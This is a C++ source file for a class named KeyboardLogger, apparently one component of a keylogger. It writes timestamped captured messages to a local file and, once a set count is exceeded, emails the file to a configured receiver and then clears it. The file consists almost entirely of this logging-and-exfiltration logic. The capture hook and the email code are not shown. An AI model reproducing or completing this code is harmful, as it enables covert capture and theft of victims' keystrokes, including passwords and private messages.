#include "KeyboardLogger.h"



KeyboardLogger::KeyboardLogger(long long maxLength, string emailReceiver)
{
	this->maxLength = maxLength;
	this->currentLength = 0;
	this->emailReceiver = emailReceiver;
}


KeyboardLogger::~KeyboardLogger()
{
}

void KeyboardLogger::addMessage(string mes)
{
	string stringToWrite;
	ofstream file(FILE_NAME, ios_base::out | ios_base::app);
	string currentTime = this->getCurrentTime();
	stringToWrite.append(currentTime);
	stringToWrite.append(": ");
	stringToWrite.append(mes);
	stringToWrite.append("\n");
	file << stringToWrite;
	currentLength++;
	if (currentLength > maxLength)
	{
		this->sendFile();
		this->clearFile();
	}
	file.close();
	return;
}

void KeyboardLogger::clearFile()
{
	ofstream file(FILE_NAME, ios_base::out | ios_base::trunc);
	file.close();
	return;
}

void KeyboardLogger::sendFile()
{
	Email email(this->emailReceiver);
	email.send();
	return;
}

string KeyboardLogger::getCurrentTime()
{
	auto end = std::chrono::system_clock::now();
	time_t currentTime = std::chrono::system_clock::to_time_t(end);
	string time = ctime(&currentTime);
	time.resize(time.size() - 1);
	return time;
}